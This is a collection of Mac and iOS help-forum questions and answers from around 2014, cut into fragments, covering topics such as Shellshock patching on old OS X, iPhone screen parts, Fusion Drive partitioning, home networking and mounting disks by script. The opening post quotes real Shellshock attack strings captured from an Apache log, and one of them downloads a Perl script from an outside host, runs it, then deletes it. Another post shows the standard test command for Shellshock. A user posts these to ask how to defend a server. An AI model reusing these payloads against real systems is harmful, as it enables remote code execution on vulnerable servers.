(Apache) off my Mac mostly as a hobby. If it becomes compromised it isn't the end of the world but it is something I would certainly like to prevent. I set up a launchctl job to check the Apache log file for possible requests related to Shellshock and last night I received to two related entries: \n82.221.128.246 - - [29/Sep/2014:08:14:41 -0400] \"GET / HTTP/1.1\" 200 2081 \"-\" \"() { :;}; /bin/bash -c \\\"wget http://82.221.105.197/bash-count.txt\\\"\"\n173.45.100.18 - - [29/Sep/2014:00:52:07 -0400] \"GET /cgi-bin/hi HTTP/1.0\" 404 208 \"-\" \"() { :;}; /bin/bash -c \\\"cd /tmp;wget http://213.5.67.223/ji;curl -O /tmp/ji http://213.5.67.223/jurat ; perl /tmp/ji;rm -rf /tmp/ji;rm -rf /tmp/ji*\\\"\"\n\nThe first one looks harmless and the IP hosts a very legitimate looking website claiming that their requests are for research purposes only. The second one is a different story though, it tries to download and run a Perl script. Fortunately I don't have wget installed so this attack didn't work but it seems like it's only a matter of time before I get a request like this that does some damage.\nApple just released patches for OS X 10.7 and latter but unfortunately I am running 10.6. What simple and reliable measures can I take (i.e. not recompiling bash) to reduce my risks?\n\nA: If you don't want to recompile Bash yourself, the folks at TenFourFox (who make a PPC version of Firefox) have compiled a binary that works on OS X 10.4 - 10.9 on both PPC and Intel Macs, and have terminal instructions for installing:\nhttp://tenfourfox.blogspot.com/2014/09/bashing-bash-one-more-time-updated.html\nAt the time of writing (Sept 30) they've compiled Bash 4.3.27, but this still misses a couple of vulnerabilities that the Apple official patch has also missed.  So it's better than nothing, but you'll want to keep watching for future updates.\n\nA: You could possibly try recompiling bash yourself using this link. It patches the vulnerable bash version, but the new version is not signed by apple and could possibly break things.\n\nA: Check the \"System Binaries\" section of this answer.

(Also, it no longer says I need 5.8 GB of space, even though I only have 3 GB left.That must be because it ALREADY used 3 GB downloading iOS 8.0.2.)\nI appreciate the thoughtful replies.\n", "Q: Need to replace iPhone screen. Are aftermarket parts OK? I have an iPhone 4 or 4s (not sure which) with a cracked screen that a friend of mine asked me to replace.  I see online that you can pick that part up for $20-$30, but they are all \"aftermarket\" (i.e. non-Apple) parts.\nI've never replaced the screen on an iPhone before, but non-Apple parts in other areas (like laptop power adapters) have always given me cause for concern.\nAre aftermarket knock-off parts OK?  Do they work as well as Apple OEM parts?  What is the quality like?\n\nA: Be willing to spend about $40 for the more expensive ones, because in the end, they'll be worth it. The parts work well, but the ribbon cables are ridiculously easy to rip and tear, so be extremely careful.\nThe cheaper ones usually have thinner glass, thus cracking easily. Also, make sure you specify either CDMA or GSM when searching for parts as the CDMA parts are different from the GSM ones, and they're not inter-compatible. \n\nA: I'm on my fourth aftermarket screen.\nAlthough I never had problems with the ribbon cables tearing they ARE very delicate and make sure you pull the ribbon cable all the way through the gap before you try putting it back together (you'll see what I mean when you try it).\nAlso, the first 2 replacement screens I had were at the cheaper end of the market and gave a really narrow field of view. If I looked at the screen side on, at less than 60 degrees above the horizontal, the colours looked inverted.\nHope this helps. Just make sure you keep track of where all the screws go, and have a laptop with you so you can watch the repair videos on youtube as you do it.\nGood luck!\n\nA: You'd better search Google on how to distinguish an original iPhone 4/4S screen and a copy one. There are many copies in aftermarket. I have seen many people complaining about the screen replacements from eBay and Amazon.\nIf you want to get one from either of them be careful not to buy the fake ones. Recently, I got an iPhone 6 screen replacement from a supplier who also installed it on my cracked phone. Now the phone is working fine.\n\nA: 1) I believe from having bought several parts on Amazon and various dealers that they're no so called \"original\" parts… But some seems to be manufactured at the same factory as Apple ones.\n2) The most comon problem I had with iPhone 4/4S is heratic touch-screen most of the time due to a piece of glass stuck on one of the corners and thus creating \"bad contacts\" on the touch screen matrix.\nTherefore I'd recommend you either to try your luck at one dealer and see if parts are reliable and \"the same\" or get them thru a dealer that has a good warranty policy.\nLast comment but not least beware one clipping the top of the screen to have use a plastic spudger to make sure  TS and LCD ribbon cables are fully passed inside the gap in order not to pinch them. If pinched then you'll fail part of the connections and experience part of the TS not working or lines on the screen…\n", "Q: Windows on Parallels 10 with 2 out of 3 monitors only I've MacBook Pro with 2 external monitors connected.

From our MobileIron interface, the device is no longer managed and the MobileIron app has been removed from the device.\n\nA: The way to complete this is to locate a downloadable version of the iOS 8 install file.  Redmond Pie has a great blog post with links to each version of the software.  \nhttp://www.redmondpie.com/ios-8-beta-download-release-date-features-rumors-and-news-update/\nOnce you download the version of 8.0 for your iPad version - following this:\nConnect ipad to computer\nClick on iPad - Summary\nHold  and click on restore.   A file dialog window should open, allowing you to manually select the restore media.   Navigate to where you downloaded the iOS software to, and select that .ipsw file from the list.  \nIt should overwrite and install the 8.0 version to the iPad.  \nRegards, \nEd\n\nA: Strange problem. Is date and time correct on your device? Know that Mobileiron can't prevent a User from upgrading the Operations system on iOS.\nWhat Ed suggested should always work.\n", "Q: Disk Utility will not let me create new partition I am attempting to create a new partition from a 3TB Fusion Drive on Mavericks, but Disk Utility won't allow it. I successfully created a partition from the same drive last month, so I am not sure why it won't allow me to create another one. Does this have something to do with the Fusion Drive? Is there a workaround? \nThank you.\n\n\nA: It looks like you partition the whole drive to be the Mac drive.\nTo undo that and create multiple partitions follow following procedure.\nHow to Partition A Fusion Drive\nLast updated January 10, 2013\nSee Controlled Fusion: Partitioning for Targeted Performance.\nShown below are two partitions of the Fusion drive in Disk Utility.\nTo partition a Fusion drive:\nBackup your stuff (two backups strongly recommended).\nBoot off any working drive (e.g. one of your backup clones).\nErase the Fusion drive (because your stuff might not fit on a downsize partition).\nIn the Partition tab, click the + button.\nDrag the slider between the partitions to size as desired.\nSet a name for the 2nd partition.\nApply.\nClone your system back to the new Boot volume (if too large, move some items first to the new 2nd volume).\nCopy your other data (data not going onto the Boot volume) onto the 2nd volume.\nSet the startup volume to the new Boot volume, reboot.\n\n", "Q: Does iOS 8's MAC address randomization give the actual MAC address once connected? iOS 8 is now implementing MAC address randomization, where it randomizes your MAC address to networks while searching for networks.\nOne article describes it as:\n\nOne of those features, which is new in iOS 8, is the automatic\n  randomization of MAC addresses when the device is searching for a\n  Wi-Fi network. This makes it much more difficult to track a device by\n  seeing which Wi-Fi networks have spotted its unique identifier.\n\nHowever, once connected to a network, does it provide the true MAC address of the network card?\n\nA: Yes. Even before you're connected, your device will give its real MAC address when you tap on a network to connect to it, to allow for MAC address filtering, etc.\nMAC address randomisation is discussed in this Apple security guide:\n\n\n*\n\n*https://www.apple.com/privacy/docs/iOS_Security_Guide_Sept_2014.pdf\n\nA: It should, but I have found no source that explicitely states it. Apple writes in its iOS Security Guide for September 2014 that\n\nWhen iOS 8 is not associated with a Wi-Fi network and a device’s processor is asleep,\n  iOS 8 uses a randomized Media Access Control (MAC) address when conducting PNO\n  scans. When iOS 8 is not associated with a Wi-Fi network or a device’s processor is\n  asleep, iOS 8 uses a randomized MAC address when conducting ePNO scans. Because\n  a device's MAC address now changes when it's not connected to a network, it can’t\n  be used to persistently track a device by passive observers of Wi-Fi traffic. \n\nThis is of course a bit ambigiuous because it doesn't explicitely describe the behaviour when the iDevice is connecting.\nIt should be noted that contrary to the statement above, the MAC address randomization currently only works if there is no cellular connection and Location Services are deactivated. \n", "Q: How does HomeKit Remote Access work? From Apple's 2014 WWDC Conference Sessions Introducing HomeKit (Slide 11) and Designing Accessories for iOS and OS X (Slide 88), it's my understanding that a User can control HomeKit-enabled/compatible accessories even if the User isn't in the same location. I presume this means that the instructions can be transmitted over the internet and I would also assume that this doesn't require a static IP at the end location (i.e. the Home with the accessories).\nIf these presumptions are accurate, how does HomeKit Remote Access work? What happens when the Home's dynamic IP changes?\nThe only information in the presentations is that this is achieved through \"iOS Device Connectivity\" and this is seamless to the app developers and accessory manufacturers.\n\nA: I haven't reviewed the presentation that you linked to, but there's no need whatsoever for static IP or even IPv4 connectivity for Home Kit to work.\nApple has been using IPv6 addresses and doing reverse DNS routing from the days of MobileMe and Back-to-My-Mac introduction in 2009 along with Snow Leopard. I would expect that Home Kit leverages IPv6 and mDNS (a.k.a. Bonjour) heavily to avoid the need for millions of households to establish fixed IP addresses or even set anything up other than log into iCloud on the appropriate devices.\nI would also expect tight integration with Apple's Airport line of routers, but also good instructions on what settings are needed on generic or third party routers.\nSee Can I use Back To My Mac's mDNS address and for ssh and other routing of traffic? for more details on the existing OS X usage of mDNS.\nIn short, no part of the communications will depend on IPv4 as long as there is a viable network connection from the equipment running in the home to Apple's Push Notification servers so that control signals can be delivered properly.\n\nA: As @bmike has suggested above, Apple has confirmed you'll need an Apple TV to support remote access.\nFrom Apple's newly posted support page: https://support.apple.com/en-us/HT204893\n\nControl your accessories away from home If you have an Apple TV (3rd\n  generation or later) with software version 7.0 or later, you can\n  control your HomeKit-enabled accessories when you're away from home\n  using your iOS device.\n\n\nA: \"iOS Device Connectivity\" i.e., remote access, one-the-one-hand, could be a standard NAT traversal/port-punching scheme. On-the-other-hand, if its simple command/control (\"turn on the porch-light\"), it could be a custom relay-server/TURN-server/XMPP-server/WebSocket-server.\n", "Q: iMovie crashes on start up.

The Airport Extreme (already purchased) is compatible with os x 10.7.5 or higher.\nWhat is the best and, most importantly, the easiest way to go about upgrading? Which os version should I upgrade to? Thank you.\n\nA: The first thing to confirm is whether your iMac originally shipped with OS X 10.6.x Snow Leopard or whether you've already upgraded it from an earlier OS X version. If your iMac came directly from Apple with an OS X 10.6.x version preinstalled, then the good news is that your system is directly compatible with Mavericks. Mavericks is a free download from the App Store and your system already meets the minimum requirements.\nThat said, I would strongly suggest upgrading your memory to 8 GB or more RAM. Your system will perform much better than it will with 4 GB. This isn't absolutely mandatory, but the performance difference would be noticeable. To determine exactly what model you have and how much RAM it can support, I recommend downloading the free Mactracker app from the App Store. The DIY repair website, ifixit.com, has great written- and video tutorials on how to upgrade your memory.\nThe best/easiest way to upgrade … That's subjective. The easiest way is to download the Mavericks installer onto your Snow Leopard system and just run it. After making sure you have a Time Machine backup from which to restore in case anything goes wrong, of course. This is called an in-place upgrade and apart from the time spent downloading and installing, there is little for you to do. If everything goes smoothly, and it generally does, you'll have a running Mavericks system with all your apps and data intact. Note that if you're using any legacy PPC apps via Rosetta, they will no longer work and you'll need to find suitable replacements.\nThe best (again, subjective) way to upgrade would be more work, but would give you a pristine base installation, including the Recovery Partition on the drive, which enables you to command+r before the startup tone and enter a special startup mode that is similar to booting to an OS X Snow Leopard DVD. More information about Recovery can be found here:\nhttp://support.apple.com/kb/HT4718\nThe specific steps I list below assumes that you have a working Time Machine backup that is current.\n\n\n*\n\n*Purchase an 8GB USB Flash memory stick.\n\n*Download DiskMaker X and install it: http://liondiskmaker.com\n\n*Download Mavericks from the App Store, but do not run the installer.\n\n*Use DiskMaker X to create a bootable Mavericks USB installer.\n\n*Backup your Snow Leopard-based system one last time to Time Machine.\n\n*Boot to the USB image by invoking the Startup Manager: http://support.apple.com/kb/HT1310\n\n*Go into Disk Utility and format your Macintosh HD (or whatever your volume is called) - Erase - with (Mac os x Journaled).\n\n*Quit Disk Utility when it's finished erasing your Snow Leopard partition.\n\n*Select Install OS X from the OS X Utilities screen.\n\n*Go through the normal steps of installation.\n\n*During the install process, you will be offered the ability to either create a user account or to migrate a user account from backup; select the backup option and point it to the location of your Time Machine backup.\n\n*After profile-/apps migration has taken place, the system will log you in and you're done.\n\n\nThe latter is a lot more work, but rather than upgrading an existing system with its many years of possible dross, you get a pristine OS, replete with Recovery Partition, and all your migrated apps and data. This is my personal definition of best. Your mileage may vary.\nIf you have any questions, I'm happy to answer them.\n", "Q: Karabiner ( KeyRemap4MacBook) Ctrl to Command, preserve Ctrl+Tab and Command+Tab I've been struggling with this for a few hours now.

How can I tell if receipient is actually recieving my message?\n\nA: The \"sent as text message\" means your text message was sent using SMS, not iMessage. Because the message wasn't sent through iMessage, neither you or the person you are texting to have access to read receipts, which allow you to see whether or not the person you sent the text message to read your message.\nThis often happens if you're in an area with bad signal, with no access to wifi, 3G, or LTE coverage and the message can only be sent via SMS.\n\nA: This happens with the phone is unable to send the message via iMessage, so it will fall back to standard SMS text messaging.\nIf they got the message?

This happened months ago as well, the difference was that after three days of being unplugged- when I plugged it back in it did come on and eventually reset. I'm at a loss and very frustrated- help!\n\nA: As there is no power switch or external fuse on the airport line of hardware, the absence of any lights when you plug it in means that the hardware is failed.\nIf you have AppleCare on the computer it might cover that airport so definitely check that if you have a covered computer. If not, the repair cost for an airport is generally not much less than a refurbished or new router. Since there's not much that even a technician can repair inside an airport once they die, you're probably looking at having to spend some money to replace the unit. \n\nA: This sounds suspiciously like a hardware fault. If you are in an area with a Genius Bar or an authorized Apple repair centre, I would take the unit in for testing/diagnosis. As these are always-on devices, they should be able to sustain brownouts and outages without issue.\n", "Q: Is handoff / continuity (iOS 8+) supported in iTunes to seamlessly switch playback between Mac and iOS? I'd love to be able to control my currently playing iPhone song from my Mac. Does anyone know if handoff / continuity is supported in iOS 8 or 9 Music.app?\n\nA: Handoff is not supported in Music.app, however your use case (control media playback on your iPhone from a Mac) would be more along the lines of what the Apple Remote app does, just in reverse.\nTunes Remote allows you to control one device from another device or a Mac. I have not used the software, so YMMV.\n\nA: As several other people have already answered, no, at this time iTunes and Music do not support Handoff.\nHowever, there used to be a piece of software that did just this, called Seamless. It was removed from the App Stores, though, after “Apple breakingly removed a component from iOS that Seamless used to allow for iPhone<->Mac communication.” The developers say they “can work around it, but it'll take some time.” Maybe it will come back at some point, in which case it could be a good workaround.\n\nA: Handoff/Continutity is not supported in Music.app \nMaybe Tunes Remote can help you?\n\nA: it appears not. I've always thought being able to continue playing a playlist or album on another device is well over due.

Once you have replaced the Xcode application try to open it and it should work. You usually can't run packages or applications from inside of a mounted dmg. It is recommended to copy what you need from the dmg and then running it.\n", "Q: is there a patch against \"Shell Shock\" for my system MacOS 10.6.8 bash version 3.2.48(1)-release (x86_64-apple-darwin10.0) I already run the following and I get \"vulnerable\" Mac\ncysunza$ env x='() { :;}; echo vulnerable' bash -c 'echo hello'\nvulnerable\nhello\nI read the post about it but appears to me that his is just for newer systems that mine, so my questions are:\nI should be worried about it?

But I'm facing this problem daily...Please tell the exact reason, and what should i do to it work properly.\n\nA: The 3 beep sounds indicate problem with your EFI.\nEFI is located on your disk in a hidden partition and is mainly responsible for booting and other key functions.\nIt is possible you do have a disk error (even if the \"authorized dealer\") did not find anything. I would suggest you use the Disk Utility and check your disk again and while at it repair the permissions.\nCheck your version.\nHow to repair EFI: Find your EXACT model here.\nhttp://support.apple.com/downloads/#macnotebooks\n\nA: Have you tried starting in recovery mode (hold CMD-R while switching on), and making sure that the drive and its contents are OK?\nAlso, if the hard disk DOES have problems, you may want to consider restoring from a backup from before you started having these problems.\n", "Q: What is the relevance of \"Low Signal\" in battery usage stats? iOS 8 shows \"Low Signal\" in the battery usage stats, like here: \n\nHow great is the effect of signal quality on battery life? In other words, if the signal quality was better, would the stats be more like, let's say, 10% or 20% instead of the 31% for Personal Hotspot?\n\nA: You’ll see “low signal” when you are using service in a poor reception area. When the phone needs to search for a signal all the time it uses more battery life. We normally see this on Home & Lock Screen and Personal Hotspot. The best thing to do to save battery in these situations is look for a way to get a better signal, or maybe even turn cellular off when you are in really bad reception areas. You can turn off cellular by going to Settings -> Cellular -> Off. With this off you can’t make calls, so you don’t want to leave this off all the time, but it can help in some situations.\n\"Better\" is relative so the percentages would probably vary by situation.\n\nA: The percentage of battery used also factors in the amount of time you were using either the personal hotspot or the phone. Therefore, the percentage of battery use will also change, based on which service you use more frequently.  \nPopstar is exactly right: constantly searching for a signal requires more power than maintaining a good signal.\nYou could look at the difference by starting with a fully charged battery and performing  tasks while connected to a poor signal and then repeating the same tasks (with a fully charged battery), for the same amount of time, while connected to a full signal. \n\nA: It's more to do with the power level of the transmitter in the phone to maintain a connection than actually searching for a signal. If it was searching then no data could pass. As the signal between the tower and device drops, the phone compensates by increasing output power to maintain the connection therefore using more power.\n\nA: Signal quality is not dependant upon you as a user; it is up to the carrier to supply these needs. At the cost that one of these carriers would charge on a monthly basis, the least they can do is provide a cellular service in which they sell the device is this not relevant \n\nA: Any phone with a bad signal strains to maintain the connection, which can eat away at battery life, there is the relevance.\n", "Q: MacBookPro10,1 had problems booting, now some system images are pink and fuzzy A friend just recently bought a MacBookPro10,1 (MacBook Pro Retina, 15-inch, Mid 2012) off of craigslist, it all checked out and worked fine until we erased the hard drive and reinstalled Mavericks (downloaded Mavericks from AppStore on my computer and used DiskMaker X v3.0.4 to create a bootable usb).\nIt would go through first stage of install (copying files), but after reboot it would hang on the Apple logo plus spinning gear thing.

My problem comes once the new drive is installed into the macbook pro it can't seem to boot from the 1TB drive at all. Disk utilities also does seems to be able to scan it correctly either and seems sluggish and it won't even let me format the drive via disk utilties either.\nFirst I thought it was the new 1TB drive, but I've just had a 2nd drive delivered and cloned the same copy of 10.6.8 on to the 2nd new drive.\nAll boots fine via sata/usb cable then once installed in macbook pro it won't boot from the new drive. Tried holding alt to give boot options, it see drive and tries to boot but stops at apple logo.\nBooted in via a clone of 10.9 on any external drive all boots fine and i can see the new internal 1TB drive. When I try to change the startup disk to the internal 1TB i get the drive is unable to be blessed. I know the drive is formated correctly and I know it boots via the sata/usb cable via the macbook pro.\nMy only think is there is something wrong with the sata cable to logic board on the macbook pro now?

Using Mac OS X 10.4\nI made a script a while ago for my Linux box in order to take archived data off of 300 floppies that automated the process. I would make an image of the floppy and copy the files directly off of the floppy. I managed to install Xcode on the machine (in order to install ddrescue)\nThe thing is on a Linux box I mounted each floppy to /media/floppy and unmounted it to ddrescue it and copied it directly to a usb drive.\nI'm trying to port my script to the Mac, and it seems that its default behavior is to automatically mount each zip floppy to the /Volumes folder, which is fine, except it uses the volume's name as its mount point folder name. So if a floppy's volume name is: \"Jimmy Bo Bobs\" it will mount to /media/Jimmy /Bo /Bobs.\nSo my question is I need to get the volume name either consistent to one name, or adaptable to the volume's name.\nSo my initial question is can I some how mount a drive to a specific folder, Like I would normally do in linux?\n #Linux\n mount /dev/sd1 /media/floppy\n #Mac\n diskutil mount /dev/disk1s1 /media/floppy #Doesn't work\n\nIf it's not possible, is there an easy way to extract the volume's name so that I can then link the script like this?\n Volumename=Jimmy Bo Bobs\n do stuff to /Volume/$Volumename\n\nI'm guessing if it's not possible I'll have to grep the mount command to the /dev/ pointer and then somehow parse that string which is what I want to avoid since it would require even more research.\n\nA: This is described in comments, but it ought to be put into an answer.  In MacOS 10.11.6 (and probably later versions), you can use\ndiskutil mount -mountPoint ~/mount /dev/disk5s1\n\nUnlike using mount, it's not necessary to specify the filesystem type, at least for hfs type disks (all that I have tried).\nI found that I had to sudo to root to do this either using mount as in @TraneFranks' answer, or with diskutil mount as above, even though I own the mount point directory.  I don't understand why sudo is needed.  Using diskutil mount without -mountPoint, the disk is mounted in a default location in /Volumes, and I don't need to be root.  However, I recommend keeping in mind that sudo might be needed, because the error message without it is mysterious.\n\nA: Yes, you can mount a drive to a specific folder. The caveat is that the user who is mounting the volume must be the mount-point owner. You do NOT need to be root or use sudo to mount a disk.\nThe first thing is to identify your raw device. diskutil list will do that nicely.\nFor example, if I have a FAT32 USB stick that I want to mount in my home dir, I list my devices and see that my raw device is /dev/disk5s1. As a normal user, I can mount it in my home directory by:\nmkdir ~/mount\nmount -r -t msdos /dev/disk5s1 ~/mount\n\nIf you then cd ~/mount ; ls, you'll see the contents of the USB stick.\nIn this example, I mounted it read-only, but you can mount your device any way you like.\nWhen you're done with the device, don't forget to unmount it, e.g.:\ndiskutil unmount ~/mount\n\n\nA: Script:\n#!/bin/bash\n\n# This is the name of the Drive as you'd see it in the finder\nvolname=<Volume Name>\n\n# Mount point you want to mount it to.\nmountPoint=/Users/<username>/extra\n\n\nfunction remount() {\n  sudo diskutil unmount \"$vol\"\n  sudo diskutil mount -mountpoint \"$mountPoint\" \"$vol\"\n  exit 0\n}\nvol=$(diskutil list | grep \"$volname\" | awk '{print $7}')\nmount | grep \"$vol\" | grep \"/Volumes/$volname\" > /dev/null && remount\n\nWhat I do is just add a cron that runs every minute. There is very little system resources for when there isn't anything to do so just run it every minute.  If it finds it, it re-maps it to the proper location.\n* * * * * <location of script> > /dev/null 2>&1\n\n", "Q: Setting an MP3s as podcasts in iTunes I have an iPod Nano 3rd Generation that I use to listen both music and podcasts from iTunes.\nNow the issue: I have a bunch of non-iTunes podcasts in MP3 format that I want to add to my iPod as podcasts. \nSo far, if I add them, they get added as music and they get mixed with the music and I don't like this solution because if I shuffle I get podcasts mixed with my music.\nThere is any way to keep those MP3 podcasts separated from my MP3 music? Is there a way to keep them with the iTunes podcasts?\n\nA: This issue has little to do with an iPod Nano but has to do with MP3 settings for the MP3 file itself in iTunes. To change a plain MP3 to a podcast, open up iTunes, select the MP3 then select Get Info on the MP3, select Options & then look at the Media Kind list. One of the Media Kind options is Podcast so just select that and then copy the newly modified MP3 file to your iPod Nano or any iDevice.

OS X's ability to rename or move a currently-open file right inside the application is really handy:\n\nTo take it one step further, is there a trick to actually delete the current file  inside the app also? (Obviously 'closing' the file would need to be the second half of the process.)\nIt would save a lot of time to not have to close the file, manually locate it in Finder, then move it to Trash - but but just delete it right there and then.\nI have tried dragging the 'file' (with the file icon to the left of the file name in window title) to the Trash icon on the Dock, but that doesn't actually move it to Trash.\nThe best I can think of is to add ~/.Trash directory as an item in Finder Favorites, then change the 'Where' in the above screenshot to the created 'Trash' Favorite shortcut, followed by a Cmd+W to close it.\nIt's a little clunky, but it's not bad.\nSo is there a nifty Automator workflow / AppleScript (which can then be easily assigned to a hotkey), to make the above process quicker?

Am I vulnarable\n\nA: The primary concern would be if you were running Web Sharing with mod_cgi enabled. The other issue is if you have remote login enabled. If the latter is enabled, your system is at risk.\nIt's unlikely that your system is all that vulnerable. If you have got Xcode's developer tools (including gcc) installed, you might want to give compiling your own binaries a try. The page linked below is chock full of different approaches to solving the particular problem:\nHow do I recompile Bash to avoid Shellshock (the remote exploit CVE-2014-6271 and CVE-2014-7169)?\nFor ease, you'd want to retain the same bash base version as you have now, which is likely v2.05b. There are newer versions available, but some differences in behaviour may cause things to break. As such, it's best to take your existing 2.x version and apply the patches available to it. Currently, there are 10 patches released for that version of bash.\nPatches can be downloaded here:\nhttps://ftp.gnu.org/gnu/bash/bash-2.05b-patches/\nThe download of the main 2.05b source is available in the parent directory:\nhttps://ftp.gnu.org/gnu/bash/\nIn summary: Are you vulnerable? Yes. Is it likely to be serious? No. If you have the skills to fix it yourself, then I recommend doing so. Apple last released a security update for Tiger in Nov 2010. As such, it's unlikely that Apple will ever release an update for that OS version again.\n", "Q: Apple 2015 fiscal year accounting calendar I was wondering if anyone know where I can acquire Apple's 2015 fiscal year accounting calendar?

I have to go through all image preview to select one.\nIs there any way to change background color of thumb? Or any other way to deal with this problem?\n\nA: I don't know of a way to fix this in the Finder. \nThe images your are looking at are most likely \"web ready\" meaning that they have been stripped of much meta data that takes up extra bytes which would slow the loading of the images into a browser. Without a pre-generated icon the Finder creates them on the fly and does not always create a meaningful icon. \nThe approach that I take is to use GraphicConverter's built in image browser which is highly configurable and -- if desired -- provides a huge amount of additional information. \n\n\nA: You can change the background color in the Finder's view options. \nYou can also change the view to Cover Flow?\n", "Q: Can you still track an iPhone after it has been logged out of iCloud? If my iPod touch 5 gets stolen and logged out of the iCloud account, can I still track it without having Find My iPhone?

To log out an iCloud account with an active Find My iPhone service, you need to enter the iCloud password, which would require them to have this information.\nFurthermore, restoring the device requires disabling Find My iPhone as mentioned above, or entering DFU mode which activates Activation Lock requiring your Apple ID to unlock the device.

I have an external hard drive, which already has a bootable partition for a Snow Leopard installation disk, and a bootable partition for Mavericks, both created with Mac OS X and working fine in Windows and Mac. \nI want to create one NTFS partition and one FAT32 partition on this external hard as well but cannot.\nIf I create it in GUID, for the sum of sizes of FAT32 and NTFS partition I get one unallocated partition in Windows. If I do it in Windows, it shows on the Mac but the content are not there.\nInspecting the hard in a partitioning tool in Windows shows that there is a 200MB hidden partition on the hard drive as well (type: primary), so I guess the problem is with the maximum 4 primary partitions limitation of MBR.\nAny suggestions? \n\nA: It might be difficult to re-partition your disk from outside the Mavericks boot without destroying it. So I would use the Mavericks' Disk Utility to do this. And make sure you have everything backup because this looks like a difficult task.\nThis 200Mb partition you're seeing is probably the EFI boot partition, Mac OS X needs it to boot. Since you're booting Mac OS X, you cannot use a MBR partition scheme, I doubt Disk Utility will even let you change it. You'll have to stay in GUID\nIn Disk Utility, you can create as many partitions as you want, except for NTFS partitions which are not natively supported by Mac OS X (you can read, but not write). You can create FAT32 or exFAT, which have the advantage of being readable and writable by windows, mac and linux. FAT32 technically has a limit of 2TB partition, but I've managed to make it work on one of my hard-drive anyway.\nYou can read up on different filesystems on here.\nAny reasons you're keeping the Snow Leopard installation disk?

We called the ISP to come fix the problem, he (according to my mother) mumbled something about an IP conflict, and moved the TC over to the 10.0.0.x subnet, resulting in this setup.\n10.0.0.1 : Time Capsule (Gateway, DHCP Server)\n192.168.0.2 : Buffalo (Bridge / Repeater, DHCP Server turned off)\n10.0.0.3 - 10.0.0.200 : DHCP Pool (Allocated by TC)\n10.0.0.201 - 10.0.0.254 : Unallocated / Reserved\nIn theory, this works, although I can't access the Buffalo router's settings and I don't like that it's on a different subnet. I changed the Buffalo router back to 10.0.0.2, and the same problems ensued. Cue my mom complaining.\nCorrect me if I'm wrong, but I don't see anything possibly wrong with the last setup. Additionally, while trying to set up an OpenVPN service on the Buffalo router, and after painstakingly experimenting with various port forwarding rules, I found that the Buffalo router couldn't access the internet.\nI'll spare you the details, but it turns out I can't access the internet when I connect using a static IP, even if the settings are exactly the same each time. Some screenshots:\n\n\nI'm convinced this has to with (or is the source of) all of our other network problems.\nThis problem is driving me nuts and I have absolutely no leads: I've called both my ISP and Apple Support and neither could give me any leads. If you have any ideas or pointers, I'd love to hear them.\n\nA: It sounds like you want a similar setup (all in 10.0.0.x range) as I have.\n- TC: connected to my modem.\n- TC: Enabled DHCP server\n- Linksys router (running DD-WRT): connected to the TC with a cable running from standard LAN to standard LAN port.\n- Linksys router: WAN port disabled\n- Linksys router: Wireless is set top bridge\nYour theory sounds good. The only thing I can think of is you made a mistake with the configuration. I included some screenshots of my configurations:\n\n\n\nA: The problem you're seeing is due to trying to use bridge mode and static addressing on the Buffalo. The solution will be to give the Buffalo a reserved IP address from the DHCP pool by associating the IP address with the Buffalo's MAC. DHCP reservations are done in Airport Utility | Network on the selected device. Then set the Buffalo to DHCP, reboot the unit and you should be good to go.\nFWIW, it's not absolutely necessary to use DHCP Reservation as long as you have Buffalo's AirStation Configuration Tool installed. That said, I understand how stable IP addressing is a desirable thing.\n\nA: So there's a lot going on here, but the reason you can't get online with a static IP address even though the settings match your DHCP-provided address is (at least based on those screen shots) probably related to your DNS settings. There's no reason that a Time Capsule should deny access based on whether a client is DHCP or static. When you provide a valid DNS server manually, does it work? If not can you post screen shots like you did for the TCP/IP settings?\n", "Q: How can I respond in a definitive fashion to an app pestering me about a permission?

This is true with nearly all Steam games,\n  ranging from Team Fortress 2 to Civilization V, and Blizzard / Battle\n  Net games like StarCraft 2 and World of Warcraft. Note these games\n  will continue to function without Assistive Access, but their feature\n  set for online communication and sharing may be limited, and thus if\n  you’re playing games and find the voice chat features aren’t working,\n  this setting or app-specific access could very well be the reason why.\n\nYou can not send a replay to it, but you can disable it in your sys pref security and privacy, and/or in the game set up.\n", "Q: Get selective folders of Time Machine backup on a new iMac I have a Time Machine backup of my former computer, but it's filled with stuff I don't want (someone said steamapps ghost folders?) and so I've installed on the new one a new version of Mavericks and I want to just pick the iTunes music folder (and some others) and copy it on the new system.\nQuestion is how can I drag (or script-get or whatever-get) the whole folder which is divided between all the backups and drop it where I want it?\nI don't want to use Migration Assistant, because you have to restore the whole account.\n\nA: Open finder and navigate to the folder on the Time Machine volume and drag it on to your desktop.\nTime Machine places each backup in it's own folder so you can easily get to the one folder you want to restore and do it by hand. You can use the Time Machine interface to restore that folder as well, but Finder is more direct. You are correct so skip migration assistant as it's not the right tool for your job.\n", "Q: Icon export @x ratio from iPhone 5 to 6+? If I’m designing icons/images in native iPhone 5 resolution, what @x multiple do I need to export them at for iPhone 6+? Just use @2x? That’s too big right? Example: an icon is 44px x 44px. If I export at @2x it’s 88px. That’s too large for 6+ right? What’s the right multiple or ratio from 5 to 6+.\nIn the past, from non-retina to retina the ratio was just doubled. So an icon of 22px would be 44px. Very annoying for Apple to do this... :/\nThank you!\n\nA: Ricardo is correct in his answer of @3x, but I'll take a shot at answering your question as well.\nIf you're working from Retina resolution assets already, the upscale factor would be an additional 1.5x for the iPhone 6 Plus.\nFor example, your 88px by 88px Retina icon would have to be up-scaled to a resolution one and a half times that amount for the iPhone Six Plus: 88*1.5=132 .\n\nA: Check this chart : https://developer.apple.com/library/ios/documentation/userexperience/conceptual/mobilehig/iconmatrix.html\nSo for your answer iPhone 6 Plus is @3x\n", "Q: Microsoft Mouse Settings do not work after restart until I open preferences I seem to have this same problem my work and home Macbook Pro Systems.

Can anyone please tell me why my iPad automatically capitalises \"Bono\" but not \"the edge\"?\n\nA: English is hard.\nOne is easily distinguishable as a proper noun. Bono is not a common word that would be anything other than a name. Like Sally or Andreas. The OS can capitalize occurrences of Bono with a high degree of confidence that you were referring to a proper noun.\nThe other is not easily distinguishable as a proper noun. There is no way to tell if the sentence:\n\nI played guitar near the edge\n\nis referring to you playing guitar near a precipice or near another human who has the legal name Dave Evans.\nYou can create a text shortcut to automatically expand a text snippet you enter like tedge to The Edge if you like.

